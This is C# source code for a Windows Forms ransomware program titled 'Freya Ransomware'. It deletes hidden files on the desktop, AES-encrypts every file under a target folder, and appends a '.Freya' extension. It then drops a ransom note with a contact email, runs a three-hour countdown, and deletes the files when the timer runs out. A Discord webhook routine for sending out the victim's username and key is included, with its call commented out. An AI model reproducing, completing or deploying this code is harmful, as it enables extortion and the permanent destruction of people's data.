using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Freya_Ransomware_v1._0._1
{
    public partial class Form1 : Form
    {

        private byte[] IV = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
        private int BlockSize = 128;

        static string dizin = @"E:\test"; //Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

        string hashx = "";

        Point lastPoint;

        public Form1()
        {
            InitializeComponent();
        }

        private string GetRandom(int lenght)
        {

            string letters = "0123456789abcdefghijklmnoprstuvyzABCDEFGHIJKLMNOPRSTUVYZБбВвГгДдЁёЖжЗзИиЙйЛлПпУуФфЦцЧчШшЩщЪъЫыЬьЭэЮюЯяㄱㄲㄴㄷㄸㄹㅁㅂㅃㅅㅆㅇㅈㅉㅊㅋㅌㅍㅎΑΒΓΔΕΖΗΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩβγδεζηθικλμνξοπρσςτυφχψω";
            Random random = new Random((int)DateTime.Now.Ticks);
            string randomstring = "";

            for (int i = 0; i < lenght; i++)
            {
                randomstring += letters[random.Next(0, letters.Length - 1)];

                hashx = randomstring;
            }
            return randomstring;
        }

        //Discord WebHook Function
        public static void sendWebHook(string URL, string msg, string username)
        {
            Http.Post(URL, new NameValueCollection()
            {
                {
                    "username",
                    username
                },
                {
                    "content",
                    msg
                }

            });
        }

        string readmenote = "Contact with us to recover your files:" + Environment.NewLine + "freyaransomwareproject@protonmail.com";
        string thanksnote = "Thanks for paying us.";


        private void Form1_Load(object sender, EventArgs e)
        {
            tmr_TriesChecker.Start();
            tmr_Checker.Start();

            hashx = GetRandom(128);

            File.Create(@"C:\users\" + Environment.UserName +@"\Desktop\Key.txt").Dispose();

            File.WriteAllText(@"C:\users\" + Environment.UserName + @"\Desktop\Key.txt", hashx);

            /*
            StreamReader sr = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
            string webhook = sr.ReadToEnd();

            sr.Close();

            webhook = webhook.Substring(webhook.IndexOf("webhookstart:"), webhook.IndexOf(":webhookend") - webhook.IndexOf("webhookstart:"));
            webhook = webhook.Replace("webhookstart:", "");
            */
            DateTime bugun = DateTime.Now;

            //sendWebHook(webhook, " [🗞️] Logs from user " + " ' " + Environment.UserName + " ' " + "at " + bugun + ":" + Environment.NewLine + "[✅]" + " " + hashx, "Freya Ransomware v1");

            string desktoppath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //define for desktop path

            #region HiddenFiles
            //Delete all hidden files on desktop because we cant encrypt hidden files :-(
            string[] filesPaths = Directory.EnumerateFiles(desktoppath + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            foreach (string file2 in filesPaths)
                File.Delete(file2);
            #endregion

            #region CountdownTimer
            
            var startTime = DateTime.Now;

            int Minutes = 180;

            var timer = new System.Windows.Forms.Timer() { Interval = 1000 };

            timer.Tick += (obj, args) =>
            label6.Text = (TimeSpan.FromMinutes(Minutes) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss");

            timer.Enabled = true;
            
            #endregion
            
            this.Hide();

            var allfiles = Directory.GetFiles(dizin, "*.*", SearchOption.AllDirectories);

            foreach (var dosya in allfiles)
            {
                listBox1.Items.Add(dosya);

                byte[] bytes = File.ReadAllBytes(dosya);

                SymmetricAlgorithm crypt = Aes.Create();
                HashAlgorithm hash = MD5.Create();
                crypt.BlockSize = BlockSize;
                crypt.Key = hash.ComputeHash(Encoding.Unicode.GetBytes(hashx));
                crypt.IV = IV;

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, crypt.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytes, 0, bytes.Length);
                    }

                    File.WriteAllBytes(dosya, memoryStream.ToArray());

                    File.Move(dosya, dosya + ".Freya");
                }
            }
            this.Show();

            File.WriteAllText(@"C:\Users\" + Environment.UserName + @"\Desktop\ReadMe.txt", readmenote);

            Process.Start(@"C:\Users\" + Environment.UserName + @"\Desktop\ReadMe.txt");

            MessageBox.Show("Don't close this application! Otherwise you will not able to recover your files anymore!");
        }

        int counter = 0;
        bool checker = true;

        private void button1_Click(object sender, EventArgs e)
        {
            var allfiles = Directory.GetFiles(dizin, "*.*", SearchOption.AllDirectories);

            foreach (var dosya in allfiles)
            {
                if (textBox1.Text == "")
                {
                    MessageBox.Show("Just write the key!");
                }

                else if (hashx == textBox1.Text)
                {

                    //Decrypt
                    byte[] bytes = File.ReadAllBytes(dosya);
                    SymmetricAlgorithm crypt = Aes.Create();
                    HashAlgorithm hash = MD5.Create();
                    crypt.Key = hash.ComputeHash(Encoding.Unicode.GetBytes(textBox1.Text));
                    crypt.IV = IV;

                    using (MemoryStream memoryStream = new MemoryStream(bytes))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, crypt.CreateDecryptor(), CryptoStreamMode.Read))
                        {
                            checker = false;

                            byte[] decryptedBytes = new byte[bytes.Length];
                            cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);
                            File.WriteAllBytes(dosya, decryptedBytes);

                            File.WriteAllBytes(dosya, decryptedBytes);

                            File.Move(dosya, dosya.Replace(".Freya", ""));

                            counter++;

                            File.Create(@"C:\Users\" + Environment.UserName + @"\Desktop\Thanks.txt").Dispose();

                            File.WriteAllText(@"C:\Users\" + Environment.UserName + @"\Desktop\Thanks.txt", thanksnote);
                        }
                    }
                }
                else if (label1.Text == "Freya Ransomware by Endarionn")
                {
                    MessageBox.Show("Enter the correct key!");

                    counter2++;

                }
            }
        }

        int counter2 = 0;


        private void label6_TextChanged(object sender, EventArgs e)
        {

            if (checker == true)
            {
                if (label6.Text == "00:00:00")
                {
                    tmr_Delete.Start();
                }
            }

            else if (label6.Text == "00:00:05")
            {
                Application.Exit();
            }

            else
            {
                //Nothing to do here!
            }
        }

        private void tmr_Delete_Tick(object sender, EventArgs e)
        {
            var allfiles = Directory.GetFiles(dizin, "*.*", SearchOption.AllDirectories);

            foreach (var dosya in allfiles)
            {
                File.Delete(dosya);
            }

            label6.Text = "00:00:00";
        }

        private void tmr_MsgBox_Tick(object sender, EventArgs e)
        {

            tmr_MsgBox.Stop();

            MessageBox.Show("Oops time is up!");
            MessageBox.Show("Deleting your files!");

        }

        private void tmr_Checker_Tick(object sender, EventArgs e)
        {
            if (listBox1.Items.Count == counter)
            {

                tmr_Checker.Stop();

                Thread.Sleep(2500);

                Process.Start(@"C:\Users\" + Environment.UserName + @"\Desktop\Thanks.txt");

                Application.Exit();


            }
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }

        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;

            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        

        private void label7_Click(object sender, EventArgs e)
        {

        }
    }
}